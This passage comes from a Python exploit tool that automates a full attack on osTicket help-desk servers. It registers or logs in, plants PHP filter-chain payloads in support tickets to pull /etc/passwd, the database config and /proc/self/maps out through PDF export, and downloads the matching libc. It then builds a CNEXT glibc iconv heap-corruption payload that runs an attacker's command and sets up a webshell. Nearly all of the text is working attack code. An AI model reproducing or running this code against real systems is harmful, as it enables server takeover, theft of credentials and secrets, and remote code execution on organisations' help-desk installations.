                json=payload,
                timeout=REQUEST_TIMEOUT,
                headers={
                    "Content-Type": "application/json",
                },
            )
            if resp.status_code == 200:
                results = resp.json()
                if isinstance(results, list):
                    return results
            log_warn(
                f"libc.rip /api/find returned "
                f"HTTP {resp.status_code}"
            )
        except requests.RequestException as exc:
            log_fail(f"libc.rip API error: {exc}")
        return []

    @classmethod
    def search_by_symbols(
        cls,
        symbols: dict[str, str],
    ) -> list[dict]:
        """Query libc.rip for libraries matching symbol offsets.

        Parameters
        ----------
        symbols : dict[str, str]
            Symbol name → hex offset (last 12 bits).
            e.g. ``{"puts": "420", "printf": "c90"}``
        """
        url = f"{cls.LIBC_RIP_API}/find"
        payload = {"symbols": symbols}
        try:
            resp = requests.post(
                url,
                json=payload,
                timeout=REQUEST_TIMEOUT,
                headers={
                    "Content-Type": "application/json",
                },
            )
            if resp.status_code == 200:
                results = resp.json()
                if isinstance(results, list):
                    return results
        except requests.RequestException as exc:
            log_fail(f"libc.rip API error: {exc}")
        return []

    @classmethod
    def download_libc(cls, build_id: str) -> Optional[bytes]:
        """Find and download the full libc matching a Build ID.

        Uses the libc.rip REST API directly (no pwntools needed).

        Returns
        -------
        bytes or None
            Raw libc ELF binary, or ``None`` on failure.
        """
        results = cls.search_by_build_id(build_id)
        if not results:
            log_fail(
                f"No libc found on libc.rip for "
                f"Build ID {build_id}"
            )
            return None

        entry = results[0]
        libc_id = entry.get("id", "unknown")
        download_url = entry.get("download_url")

        log_good(f"Matched: {libc_id}")

        if not download_url:
            log_fail(
                f"No download_url in response for {libc_id}"
            )
            return None

        log_info(f"Downloading from {download_url}…")
        try:
            resp = requests.get(download_url, timeout=60)
            if (
                resp.status_code == 200
                and len(resp.content) > 1000
            ):
                return resp.content
            log_fail(
                f"Download failed: HTTP {resp.status_code}, "
                f"{len(resp.content)} bytes"
            )
        except requests.RequestException as exc:
            log_fail(f"Download error: {exc}")
        return None


# ═══════════════════════════════════════════════════════════════════════════════
#  CNEXT PAYLOAD GENERATOR  (CVE-2024-2961)
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class MemoryRegion:
    """A single entry from ``/proc/self/maps``."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


class CNEXTBuilder:
    """Generate the CNEXT heap-corruption payload that converts an
    arbitrary PHP file-read into remote code execution.

    Adapted from the original exploit by Charles Fol (@cfreal_):
    https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py

    The payload leverages a buffer overflow in glibc's ``iconv()``
    (CVE-2024-2961) to overwrite the PHP ``zend_mm_heap`` structure,
    hijacking ``custom_heap`` function pointers to call ``system()``.
    """

    def __init__(
        self,
        command: str,
        maps_data: bytes,
        libc_path: str,
        pad: int = 20,
        sleep_seconds: int = 1,
    ) -> None:
        self.command = command
        self.maps_data = maps_data
        self.libc_path = libc_path
        self.pad = pad
        self.sleep_seconds = sleep_seconds

    # -- Memory layout parsing ------------------------------------------------

    def _parse_regions(self) -> list[MemoryRegion]:
        """Parse ``/proc/self/maps`` into a list of :class:`MemoryRegion`.

        Uses field-based splitting instead of regex to handle
        variable whitespace between fields (common on CentOS/RHEL).
        """
        regions: list[MemoryRegion] = []
        text = self.maps_data.decode("utf-8", errors="replace")
        for line in text.strip().splitlines():
            fields = line.split()
            if len(fields) < 5:
                continue
            # fields: [addr_range, perms, offset, dev, inode, path?]
            addr_range = fields[0]
            perms = fields[1]
            path = fields[5] if len(fields) >= 6 else ""

            parts = addr_range.split("-")
            if len(parts) != 2:
                continue
            try:
                start = int(parts[0], 16)
                stop = int(parts[1], 16)
            except ValueError:
                continue

            regions.append(
                MemoryRegion(start, stop, perms, path)
            )
        return regions

    def _find_heap(self, regions: list[MemoryRegion]) -> int:
        """Locate the main ``zend_mm_heap`` address."""
        candidates = [
            r.stop - HEAP_SIZE + 0x40
            for r in reversed(regions)
            if (
                r.permissions == "rw-p"
                and r.size >= HEAP_SIZE
                and r.stop & (HEAP_SIZE - 1) == 0
                and r.path in ("", "[anon:zend_alloc]")
            )
        ]
        if not candidates:
            raise RuntimeError("Cannot locate PHP heap in /proc/self/maps")
        return candidates[0]

    def _find_libc_base(self, regions: list[MemoryRegion]) -> int:
        """Return the base address of glibc in the target's address space."""
        glibc_re = re.compile(
            r"/(libc\.so\.6|libc-\d+\.\d+\.so)\b"
        )
        for r in regions:
            if glibc_re.search(r.path):
                return r.start

        # Debug: show what we found
        all_libc = [
            f"{os.path.basename(r.path)} "
            f"(0x{r.start:x}, {r.permissions})"
            for r in regions
            if r.path and "libc" in os.path.basename(r.path).lower()
        ]
        # Deduplicate for readability
        seen = set()
        unique_libc = []
        for item in all_libc:
            name = item.split(" (")[0]
            if name not in seen:
                seen.add(name)
                unique_libc.append(item)

        raise RuntimeError(
            "Cannot locate glibc region in /proc/self/maps.  "
            f"Found {len(regions)} regions total.  "
            "libc-related: "
            + (", ".join(unique_libc) if unique_libc else "NONE")
        )

    # -- Chunked-encoding helpers (mirrors the original exploit) ---------------

    @staticmethod
    def _chunked_chunk(data: bytes, size: Optional[int] = None) -> bytes:
        if size is None:
            size = len(data) + 8
        keep = len(data) + 2  # two newlines
        header = f"{len(data):x}".rjust(size - keep, "0")
        return header.encode() + b"\n" + data + b"\n"

    @classmethod
    def _compressed_bucket(cls, data: bytes) -> bytes:
        return cls._chunked_chunk(data, 0x8000)

    @staticmethod
    def _zlib_raw(data: bytes) -> bytes:
        """Compress with zlib, strip header/checksum (raw deflate)."""
        return zlib.compress(data, 9)[2:-4]

    @staticmethod
    def _qpe(data: bytes) -> bytes:
        """Quoted-Printable encode."""
        return "".join(f"={b:02X}" for b in data).encode()

    def _ptr_bucket(self, *ptrs: int, size: Optional[int] = None) -> bytes:
        if size is not None:
            assert len(ptrs) * 8 == size
        bucket = b"".join(p64(p) for p in ptrs)
        bucket = self._qpe(bucket)
        bucket = self._chunked_chunk(bucket)
        bucket = self._chunked_chunk(bucket)
        bucket = self._chunked_chunk(bucket)
        return self._compressed_bucket(bucket)

    # -- Main payload assembly ------------------------------------------------

    def build(self) -> str:
        """Assemble the full CNEXT ``php://filter/…`` payload string.

        Returns
        -------
        str
            A ``php://filter/read=…/resource=data:…`` URI ready for
            injection into osTicket.
        """
        if not HAS_PWNTOOLS:
            raise RuntimeError(
                "pwntools is required for CNEXT payload generation"
            )

        regions = self._parse_regions()
        heap_addr = self._find_heap(regions)
        libc_base = self._find_libc_base(regions)

        libc_elf = ELF(self.libc_path, checksec=False)
        libc_elf.address = libc_base

        addr_emalloc = libc_elf.symbols["__libc_malloc"]
        addr_efree = libc_elf.symbols["__libc_system"]
        addr_erealloc = libc_elf.symbols["__libc_realloc"]

        addr_free_slot = heap_addr + 0x20
        addr_custom_heap = heap_addr + 0x0168
        addr_fake_bin = addr_free_slot - 0x10

        cs = 0x100

        # -- Pad ---------------------------------------------------------------
        pad_size = cs - 0x18
        pad_data = b"\x00" * pad_size
        pad_data = self._chunked_chunk(pad_data, len(pad_data) + 6)
        pad_data = self._chunked_chunk(pad_data, len(pad_data) + 6)
        pad_data = self._chunked_chunk(pad_data, len(pad_data) + 6)
        pad_data = self._compressed_bucket(pad_data)

        # -- Step 1: reverse freelist order ------------------------------------
        step1 = b"\x00"
        step1 = self._chunked_chunk(step1)
        step1 = self._chunked_chunk(step1)
        step1 = self._chunked_chunk(step1, cs)
        step1 = self._compressed_bucket(step1)

        # -- Step 2: place fake pointer ----------------------------------------
        s2_size = 0x48
        step2 = b"\x00" * (s2_size + 8)
        step2 = self._chunked_chunk(step2, cs)
        step2 = self._chunked_chunk(step2)
        step2 = self._compressed_bucket(step2)

        step2_ptr = b"0\n".ljust(s2_size, b"\x00") + p64(addr_fake_bin)
        step2_ptr = self._chunked_chunk(step2_ptr, cs)
        step2_ptr = self._chunked_chunk(step2_ptr)
        step2_ptr = self._compressed_bucket(step2_ptr)

        # -- Step 3: trigger the iconv overflow --------------------------------
        step3_of = b"\x00" * (cs - len(CNEXT_BUG_CHAR)) + CNEXT_BUG_CHAR
        step3_of = self._chunked_chunk(step3_of)
        step3_of = self._chunked_chunk(step3_of)
        step3_of = self._chunked_chunk(step3_of)
        step3_of = self._compressed_bucket(step3_of)

        # -- Step 4: overwrite zend_mm_heap ------------------------------------
        step4 = b"=00" + b"\x00" * (cs - 1)
        step4 = self._chunked_chunk(step4)
        step4 = self._chunked_chunk(step4)
        step4 = self._chunked_chunk(step4)
        step4 = self._compressed_bucket(step4)

        step4_pwn = self._ptr_bucket(
            0x200000, 0,
            # free_slot[]
            0, 0, addr_custom_heap, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0,
            heap_addr,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            size=cs,
        )

        step4_custom = self._ptr_bucket(
            addr_emalloc, addr_efree, addr_erealloc, size=0x18
        )

        # Command to execute — kill parent first to avoid crash loops
        cmd = f"kill -9 $PPID; sleep {self.sleep_seconds}; {self.command}"
        cmd_bytes = cmd.encode() + b"\x00"
        cmd_pad_size = 0x140
        assert len(cmd_bytes) <= cmd_pad_size, (
            f"Command too long ({len(cmd_bytes)} bytes); "
            f"max {cmd_pad_size} bytes"
        )
        cmd_bytes = cmd_bytes.ljust(cmd_pad_size, b"\x00")

        step4_cmd = self._qpe(cmd_bytes)
        step4_cmd = self._chunked_chunk(step4_cmd)
        step4_cmd = self._chunked_chunk(step4_cmd)
        step4_cmd = self._chunked_chunk(step4_cmd)
        step4_cmd = self._compressed_bucket(step4_cmd)

        # -- Assemble all pages ------------------------------------------------
        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom
            + step4_cmd
            + step3_of
            + pad_data * self.pad
            + step1 * 3
            + step2_ptr
            + step2 * 2
        )

        resource = self._zlib_raw(self._zlib_raw(pages))
        resource_b64 = base64.b64encode(resource).decode()
        data_uri = f"data:text/plain;base64,{resource_b64}"

        filters = "|".join([
            "zlib.inflate",
            "zlib.inflate",
            "dechunk", "convert.iconv.L1.L1",
            "dechunk", "convert.iconv.L1.L1",
            "dechunk", "convert.iconv.L1.L1",
            "dechunk", "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            "convert.quoted-printable-decode", "convert.iconv.L1.L1",
        ])

        return f"php://filter/read={filters}/resource={data_uri}"


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN EXPLOIT ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════════

class OsTicketExploit:
    """End-to-end CVE-2026-22200 exploit automation.

    Instantiate with the target URL and call :meth:`run` to execute
    the full attack chain interactively.
    """

    def __init__(
        self,
        target_url: str,
        proxy: Optional[str] = None,
        webshell_name: Optional[str] = None,
        topic_id: Optional[int] = None,
        oneshot_cmd: Optional[str] = None,
    ) -> None:
        # Normalise the base URL
        self.base_url = target_url.rstrip("/") + "/"
        self.proxy = proxy
        self.webshell_name = webshell_name or f"ost-{random_string(6)}.php"
        self._oneshot_cmd = oneshot_cmd
        self.session: requests.Session = build_session(proxy=proxy)

        # State populated during the exploit
        self.email: Optional[str] = None
        self.password: Optional[str] = None
        self.ticket_id: Optional[int] = None
        self.topic_id: Optional[int] = topic_id

        # Tempdir for intermediate artefacts
        self._tmpdir = tempfile.mkdtemp(prefix="osticket_pwn_")
        self._maps_data: Optional[bytes] = None
        self._config_data: Optional[bytes] = None
        self._libc_path: Optional[str] = None
        self._shell_url: Optional[str] = None
        self._registration_open: bool = False

    # -- URL helpers -----------------------------------------------------------

    def _url(self, path: str) -> str:
        return urljoin(self.base_url, path)

    # ──────────────────────────────────────────────────────────────────────────
    #  STAGE 1: Reconnaissance
    # ──────────────────────────────────────────────────────────────────────────

    def stage_recon(self) -> bool:
        """Detect osTicket, check vulnerability indicators, and find
        whether self-registration is open.

        Returns ``True`` if exploitation should proceed.
        """
        log_stage(1, "RECONNAISSANCE")

        # 1a. Check that the target is actually osTicket
        log_info("Probing target for osTicket installation…")
        try:
            resp = self.session.get(
                self._url("open.php"), timeout=REQUEST_TIMEOUT
            )
        except requests.RequestException as exc:
            log_fail(f"Cannot reach target: {exc}")
            return False

        if resp.status_code != 200:
            log_fail(f"open.php returned HTTP {resp.status_code}")
            return False

        body_lower = resp.text.lower()
        if "osticket" not in body_lower and "help-topic" not in body_lower:
            log_fail("Target does not appear to be osTicket.")
            return False
        log_good("osTicket installation detected.")

        # 1b. Discover help-topic IDs & rich-text support
        if self.topic_id:
            log_info(f"Using user-supplied topic ID: {self.topic_id}")
        else:
            self.topic_id = self._find_html_topic(resp.text)

        if self.topic_id:
            log_good(
                f"Using help-topic ID {self.topic_id} "
                f"(rich-text enabled)."
            )
        else:
            log_warn(
                "Could not find a help-topic with rich-text enabled."
            )
            # Check if the default form at least has richtext
            if 'class="richtext' in body_lower:
                log_good(
                    "Default open.php form HAS rich-text editor — "
                    "proceeding without specific topic."
                )
            else:
                log_fail(
                    "Default open.php form does NOT have a rich-text "
                    "editor.  The HTML payload will likely be stripped "
                    "to plain text and the exploit will fail."
                )
                log_warn(
                    "Possible workarounds:\n"
                    "      1. Find a topic ID that uses rich-text and "
                    "pass it with --topic-id\n"
                    "      2. Inject the payload via a different vector "
                    "(e.g. ticket reply after login)\n"
                    "      3. Check the Admin Panel → Settings → Tickets "
                    "for HTML thread mode"
                )
                # Don't abort — the user might still want to try, or
                # the authenticated reply form might support HTML.

        # 1c. Vulnerability check (login validation)
        self._check_vuln_login()

        # 1d. Self-registration?
        self._registration_open = self._check_registration()
        if self._registration_open:
            log_good("Public user registration is ENABLED.")
        else:
            log_warn(
                "Registration appears disabled.  "
                "You will need existing credentials."
            )

        return True

    def _find_html_topic(self, open_page_html: str) -> Optional[int]:
        """Return the first topic ID whose form contains a rich-text field.

        Tries three approaches:
        1. AJAX form endpoint for each topic
        2. Direct ``open.php?topicId=X`` load
        3. Default form on ``open.php``
        """
        topic_ids = extract_topic_ids(open_page_html)
        if not topic_ids:
            log_warn("No help-topic <option> values found in open.php.")
            return None

        log_info(f"Found {len(topic_ids)} help-topic(s): {topic_ids}")

        for tid in topic_ids:
            # Method 1: AJAX form endpoint
            try:
                ajax_url = self._url(
                    f"ajax.php/form/help-topic/{tid}/forms"
                )
                resp = self.session.get(
                    ajax_url,
                    timeout=REQUEST_TIMEOUT,
                    headers={"X-Requested-With": "XMLHttpRequest"},
                )
                if (
                    resp.status_code == 200
                    and 'class="richtext' in resp.text.lower()
                ):
                    log_info(
                        f"  Topic {tid}: rich-text found (via AJAX)."
                    )
                    return tid
                log_debug(
                    f"  Topic {tid}: no rich-text via AJAX "
                    f"(HTTP {resp.status_code})."
                )
            except requests.RequestException:
                pass

            # Method 2: Direct page load with topicId parameter
            try:
                resp = self.session.get(
                    self._url(f"open.php?topicId={tid}"),
                    timeout=REQUEST_TIMEOUT,
                )
                if (
                    resp.status_code == 200
                    and 'class="richtext' in resp.text.lower()
                ):
                    log_info(
                        f"  Topic {tid}: rich-text found "
                        f"(via direct load)."
                    )
                    return tid
                log_debug(
                    f"  Topic {tid}: no rich-text via direct load."
                )
            except requests.RequestException:
                pass

        # Method 3: Fallback — default form has richtext
        if 'class="richtext' in open_page_html.lower() and topic_ids:
            log_info("  Default form has rich-text; using first topic.")
            return topic_ids[0]

        return None

    def _check_vuln_login(self) -> Optional[str]:
        """Submit a malformed username to detect the v1.18.3+ patch."""
        log_info("Checking login endpoint for vulnerability indicator…")
        try:
            resp = self.session.get(
                self._url("login.php"), timeout=REQUEST_TIMEOUT
            )
            csrf = extract_csrf_token(resp.text)
            if not csrf:
                log_warn("Could not extract CSRF token from login.php.")
                return None
            payload = {
                "__CSRFToken__": csrf,
                "luser": "test|invalid<>user",
                "lpasswd": "testpassword123",
            }
            resp = self.session.post(
                self._url("login.php"),
                data=payload,
                timeout=REQUEST_TIMEOUT,
            )
            body = resp.text.lower()
            if "invalid user id" in body:
                log_warn("Target appears PATCHED (≥ v1.18.3 / v1.17.7).")
                return "patched"
            if "invalid username or password" in body or "access denied" in body:
                log_good("Target appears VULNERABLE (< v1.18.3).")
                return "vulnerable"
        except requests.RequestException as exc:
            log_warn(f"Login check failed: {exc}")
        return None

    def _check_registration(self) -> bool:
        """Check whether ``account.php`` exposes a registration form."""
        try:
            resp = self.session.get(
                self._url("account.php"), timeout=REQUEST_TIMEOUT
            )
            indicators = (
                "passwd2", "create a password", "confirm new password"
            )
            return any(ind in resp.text.lower() for ind in indicators)
        except requests.RequestException:
            return False

    # ──────────────────────────────────────────────────────────────────────────
    #  STAGE 2: Authentication
    # ──────────────────────────────────────────────────────────────────────────

    def stage_authenticate(self) -> bool:
        """Register (if possible) and log in to the client portal.

        Returns ``True`` on successful authentication.
        """
        log_stage(2, "AUTHENTICATION")

        if self._registration_open:
            self.email = input(
                f"  {Style.CYAN}[?]{Style.RESET} Enter email for new "
                f"account (or existing): "
            ).strip()
            self.password = input(
                f"  {Style.CYAN}[?]{Style.RESET} Enter password: "
            ).strip()

            if not self.email or not self.password:
                log_fail("Email and password are required.")
                return False

            self._try_register(self.email, self.password)
        else:
            log_info(
                "Registration is closed; please supply existing "
                "credentials."
            )
            self.email = input(
                f"  {Style.CYAN}[?]{Style.RESET} Email: "
            ).strip()
            self.password = input(
                f"  {Style.CYAN}[?]{Style.RESET} Password: "
            ).strip()
            if not self.email or not self.password:
                log_fail("Credentials required.")
                return False

        return self._login()

    def _try_register(self, email: str, password: str) -> bool:
        """Attempt to create a new osTicket user account."""
        log_info(f"Attempting registration for {email}…")
        try:
            resp = self.session.get(
                self._url("account.php"), timeout=REQUEST_TIMEOUT
            )
            csrf = extract_csrf_token(resp.text)
            if not csrf:
                log_warn(
                    "No CSRF token on account.php — skipping registration."
                )
                return False

            data = {
                "do": "create",
                "__CSRFToken__": csrf,
                "name": email.split("@")[0].replace(".", " ").title(),
                "email": email,
                "passwd1": password,
                "passwd2": password,
                "backend": "client",
            }
            resp = self.session.post(
                self._url("account.php"),
                data=data,
                timeout=REQUEST_TIMEOUT,
            )
            body = resp.text.lower()
            if "email already registered" in body:
                log_info("Email already registered — will attempt login.")
                return True
            if "account confirmed" in body or "tickets.php" in resp.url:
                log_good("Account created successfully!")
                return True
            if "confirmation" in body or "verify" in body:
                log_warn(
                    "Registration requires email confirmation.  "
                    "Please confirm and press Enter to continue."
                )
                input(
                    f"  {Style.CYAN}[?]{Style.RESET} "
                    f"Press Enter after confirming… "
                )
                return True

            log_warn("Registration response unclear; will try logging in.")
            return True

        except requests.RequestException as exc:
            log_fail(f"Registration error: {exc}")
            return False

    def _login(self) -> bool:
        """Authenticate via ``login.php``."""
        log_info(f"Logging in as {self.email}…")
        try:
            # Fresh session to avoid stale cookies
            self.session = build_session(proxy=self.proxy)
            resp = self.session.get(
                self._url("login.php"), timeout=REQUEST_TIMEOUT
            )
            csrf = extract_csrf_token(resp.text)
            if not csrf:
                log_fail("Cannot extract CSRF token from login page.")
                return False

            data = {
                "__CSRFToken__": csrf,
                "luser": self.email,
                "lpasswd": self.password,
                "do": "scplogin",
            }
            resp = self.session.post(
                self._url("login.php"),
                data=data,
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True,
            )
            if "tickets.php" in resp.url or "profile.php" in resp.url:
                log_good("Login successful!")
                return True

            if resp.status_code == 200 and "log out" in resp.text.lower():
                log_good("Login successful!")
                return True

            log_fail("Login failed.  Check credentials.")
            log_debug(f"  Final URL: {resp.url}")
            log_debug(
                f"  Response snippet: "
                f"{resp.text[:300].strip()!r}"
            )
            return False

        except requests.RequestException as exc:
            log_fail(f"Login error: {exc}")
            return False

    # ──────────────────────────────────────────────────────────────────────────
    #  STAGE 3: File exfiltration via PHP filter chains
    # ──────────────────────────────────────────────────────────────────────────

    def stage_file_exfiltration(self) -> bool:
        """Create a ticket containing PHP filter payloads, export to PDF,
        and extract the target files.

        Returns ``True`` if at least ``/proc/self/maps`` was recovered.
        """
        log_stage(3, "FILE EXFILTRATION VIA PHP FILTER CHAINS")

        # Build filter URIs for the files we need
        targets = {
            "/etc/passwd": "plain",
            "include/ost-config.php": "plain",
            "/proc/self/maps": "b64zlib",
        }
        log_info("Generating PHP filter chain payloads…")
        uris: list[str] = []
        for path, enc in targets.items():
            log_info(f"  → {path}  (encoding: {enc})")
            uris.append(
                PayloadGenerator.build_file_read_filter(path, enc)
            )

        html_payload = PayloadGenerator.wrap_for_ticket(
            uris, is_reply=False
        )
        log_good(f"Payload size: {len(html_payload):,} characters.")

        # Save raw payload for inspection
        payload_path = os.path.join(self._tmpdir, "payload_ticket.html")
        with open(payload_path, "w") as fh:
            fh.write(html_payload)
        log_debug(f"Raw payload saved: {payload_path}")

        # Create the ticket
        log_info("Creating support ticket with payload…")
        self.ticket_id = self._create_ticket(html_payload)
        if not self.ticket_id:
            log_fail("Failed to create ticket.")
            return False
        log_good(f"Ticket created (internal ID: {self.ticket_id}).")

        # Export the ticket to PDF
        log_info("Exporting ticket to PDF…")
        pdf_bytes = self._print_ticket_pdf(self.ticket_id)
        if not pdf_bytes:
            log_fail("Failed to export ticket PDF.")
            return False
        log_good(f"PDF received ({len(pdf_bytes):,} bytes).")

        # Save PDF for manual inspection
        pdf_path = os.path.join(self._tmpdir, "ticket_export.pdf")
        with open(pdf_path, "wb") as fh:
            fh.write(pdf_bytes)
        log_info(f"PDF saved: {pdf_path}")

        # Extract embedded images
        log_info("Extracting file data from PDF images…")
        extracted = PDFExtractor.extract_from_pdf(
            pdf_bytes, save_dir=self._tmpdir
        )
        if not extracted:
            log_fail("No exfiltrated data found in PDF.")
            log_fail(
                f"PDF and debug artefacts saved in: {self._tmpdir}"
            )
            log_info(
                "Tip: Open the PDF manually — if you only see text "
                "and no garbled images, the HTML payload was stripped."
            )
            self._attempt_reply_fallback(uris)
            # Re-check after fallback
            if self._maps_data:
                return True
            return False
        log_good(f"Extracted {len(extracted)} file(s) from PDF.")

        # Classify the extracted files
        self._classify_extracted(extracted)

        if self._maps_data is None:
            log_fail(
                "/proc/self/maps not recovered — CNEXT stage will fail."
            )
            return False

        return True

    def _attempt_reply_fallback(self, uris: list[str]) -> None:
        """When the initial ticket creation strips HTML, try injecting
        via a reply instead (the authenticated reply form often uses
        a rich-text editor even when open.php does not).
        """
        if not self.ticket_id:
            return

        log_warn(
            "Attempting fallback: inject payload via ticket REPLY "
            "(authenticated forms often support rich-text)…"
        )

        # Check if the ticket page has a rich-text reply form
        try:
            resp = self.session.get(
                self._url(f"tickets.php?id={self.ticket_id}"),
                timeout=REQUEST_TIMEOUT,
            )
            if 'class="richtext' not in resp.text.lower():
                log_fail(
                    "Reply form also lacks rich-text editor.  "
                    "Fallback will not work."
                )
                return
            log_good(
                "Reply form has rich-text editor — injecting payload."
            )
        except requests.RequestException:
            return

        reply_html = PayloadGenerator.wrap_for_ticket(
            uris, is_reply=True
        )
        if not self._reply_to_ticket(self.ticket_id, reply_html):
            log_fail("Failed to post reply.")
            return
        log_good("Reply posted with payload.")

        log_info("Exporting updated ticket to PDF…")
        pdf_bytes = self._print_ticket_pdf(self.ticket_id)
        if not pdf_bytes:
            log_fail("Failed to export PDF after reply.")
            return

        # Save new PDF
        pdf_path = os.path.join(self._tmpdir, "ticket_reply_export.pdf")
        with open(pdf_path, "wb") as fh:
            fh.write(pdf_bytes)
        log_info(f"PDF saved: {pdf_path}")

        extracted = PDFExtractor.extract_from_pdf(
            pdf_bytes, save_dir=self._tmpdir
        )
        if extracted:
            log_good(
                f"Fallback succeeded!  Extracted {len(extracted)} "
                f"file(s) from reply-based PDF."
            )
            self._classify_extracted(extracted)
        else:
            log_fail("Fallback also failed — no data in reply PDF.")

    def _classify_extracted(self, extracted: list[bytes]) -> None:
        """Identify and log each extracted file chunk."""
        for i, data in enumerate(extracted):
            fpath = os.path.join(self._tmpdir, f"extracted_{i}.bin")
            with open(fpath, "wb") as fh:
                fh.write(data)

            if b"root:" in data or b"/bin/" in data:
                log_good(f"  [{i}] /etc/passwd ({len(data):,} bytes)")
                for line in (
                    data.decode("utf-8", errors="replace")
                    .splitlines()[:5]
                ):
                    print(
                        f"        {Style.DIM}{line}{Style.RESET}"
                    )

            elif b"SECRET_SALT" in data or b"DBPASS" in data:
                log_good(
                    f"  [{i}] include/ost-config.php "
                    f"({len(data):,} bytes)"
                )
                self._config_data = data
                for line in (
                    data.decode("utf-8", errors="replace").splitlines()
                ):
                    if "SECRET_SALT" in line or "DBPASS" in line:
                        print(
                            f"        {Style.YELLOW}"
                            f"{line.strip()}{Style.RESET}"
                        )

            elif (
                b"libc" in data
                or b"[heap]" in data
                or b"r--p" in data
            ):
                log_good(
                    f"  [{i}] /proc/self/maps ({len(data):,} bytes)"
                )
                self._maps_data = data

            else:
                log_info(f"  [{i}] unknown ({len(data):,} bytes)")
                log_debug(
                    f"    Preview: "
                    f"{data[:120].decode('utf-8', errors='replace')!r}"
                )

    def _create_ticket(self, html_body: str) -> Optional[int]:
        """Submit a new support ticket containing the payload HTML.

        If a ``topic_id`` is set, loads ``open.php?topicId=X`` first
        so the server returns the correct form (with rich-text field).
        """
        try:
            # Load open.php — with topicId if we have one, so that the
            # server renders the correct dynamic form
            open_url = self._url("open.php")
            if self.topic_id:
                open_url = self._url(
                    f"open.php?topicId={self.topic_id}"
                )
            resp = self.session.get(open_url, timeout=REQUEST_TIMEOUT)
            csrf = extract_csrf_token(resp.text)
            if not csrf:
                log_fail("No CSRF token on open.php.")
                return None

            data = {
                "__CSRFToken__": csrf,
                "a": "open",
                "topicId": self.topic_id or "",
                "name": (
                    self.email.split("@")[0].title()
                    if self.email
                    else "Test"
                ),
                "email": self.email or "",
                "subject": f"Support Request {random_string(6)}",
                "message": html_body,
            }

            log_debug(
                f"POST open.php — topicId={self.topic_id}, "
                f"message length={len(html_body)}"
            )

            resp = self.session.post(
                self._url("open.php"),
                data=data,
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True,
            )

            log_debug(f"Response URL: {resp.url}")
            log_debug(f"Response status: {resp.status_code}")

            # Save response for debugging
            resp_path = os.path.join(
                self._tmpdir, "create_ticket_response.html"
            )
            with open(resp_path, "w") as fh:
                fh.write(resp.text)

            # Check for validation errors
            body_lower = resp.text.lower()
            if "unable to create" in body_lower:
                log_fail(
                    "osTicket rejected the ticket.  "
                    "Check response in: " + resp_path
                )
                # Try to extract specific error
                err_match = re.search(
                    r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>',
                    resp.text,
                    re.DOTALL | re.IGNORECASE,
                )
                if err_match:
                    log_fail(
                        f"  Error: {err_match.group(1).strip()[:200]}"
                    )
                return None

            # Try to find the ticket ID from the redirect URL
            match = re.search(r"tickets\.php\?id=(\d+)", resp.url)
            if match:
                return int(match.group(1))

            # Fallback: parse from the response body
            match = re.search(
                r'tickets\.php\?id=(\d+)', resp.text
            )
            if match:
                return int(match.group(1))

            # Last resort: navigate to tickets.php and find it
            resp2 = self.session.get(
                self._url("tickets.php"), timeout=REQUEST_TIMEOUT
            )
            matches = re.findall(
                r'tickets\.php\?id=(\d+)', resp2.text
            )
            if matches:
                return int(matches[0])

            log_warn(
                "Ticket may have been created but ID not found.  "
                "Response saved: " + resp_path
            )
            return None

        except requests.RequestException as exc:
            log_fail(f"Ticket creation error: {exc}")
            return None

    def _print_ticket_pdf(self, ticket_id: int) -> Optional[bytes]:
        """Trigger the 'Print to PDF' action and return raw PDF bytes."""
        url = self._url(f"tickets.php?a=print&id={ticket_id}")
        try:
            resp = self.session.get(url, timeout=60)
            if resp.status_code == 200 and resp.content[:5] == b"%PDF-":
                return resp.content

            log_warn(
                f"PDF response: HTTP {resp.status_code}, "
                f"Content-Type="
                f"{resp.headers.get('Content-Type', 'unknown')}, "
                f"body length={len(resp.content)}"
            )

            # Sometimes the content has a prefix before %PDF-
            if b"%PDF-" in resp.content:
                start = resp.content.index(b"%PDF-")
                return resp.content[start:]

            log_debug(
                f"  First 200 bytes: {resp.content[:200]!r}"
            )
            return None

        except requests.RequestException as exc:
            log_fail(f"PDF export error: {exc}")
            return None

    def _reply_to_ticket(
        self, ticket_id: int, html_body: str
    ) -> bool:
        """Post a reply to an existing ticket."""
        try:
            resp = self.session.get(
                self._url(f"tickets.php?id={ticket_id}"),
                timeout=REQUEST_TIMEOUT,
            )
            csrf = extract_csrf_token(resp.text)
            if not csrf:
                log_warn("No CSRF token on ticket page.")
                return False

            num_match = re.search(
                r'name=["\']id["\'][^>]*value=["\'](\d+)["\']',
                resp.text,
            )
            tid = (
                num_match.group(1) if num_match else str(ticket_id)
            )

            data = {
                "__CSRFToken__": csrf,
                "id": tid,
                "a": "reply",
                "reply": html_body,
            }
            resp = self.session.post(
                self._url("tickets.php"),
                data=data,
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True,
            )
            return resp.status_code == 200

        except requests.RequestException as exc:
            log_fail(f"Reply error: {exc}")
            return False

    @staticmethod
    def _looks_like_maps(data: bytes) -> bool:
        """Check if data looks like /proc/self/maps content."""
        try:
            text = data[:200].decode("utf-8", errors="strict")
        except UnicodeDecodeError:
            return False
        # /proc/self/maps lines look like:
        # 55b3a7f00000-55b3a7f21000 r-xp 00000000 ...
        return bool(
            re.search(r"[0-9a-f]+-[0-9a-f]+\s+r", text)
        )

    # ──────────────────────────────────────────────────────────────────────────
    #  STAGE 4: Partial libc exfiltration + download
    # ──────────────────────────────────────────────────────────────────────────

    def stage_libc_acquisition(self) -> bool:
        """Exfiltrate a partial ``libc.so.6`` from the target, fingerprint
        it by Build ID, and download the full binary from libc.rip.

        Creates a **new ticket** with the libc payload (replies are not
        always rendered in the PDF export).

        Returns ``True`` if the full libc is ready.
        """
        log_stage(4, "LIBC FINGERPRINTING & DOWNLOAD")

        # Identify the glibc path from /proc/self/maps.
        # Must match glibc specifically:
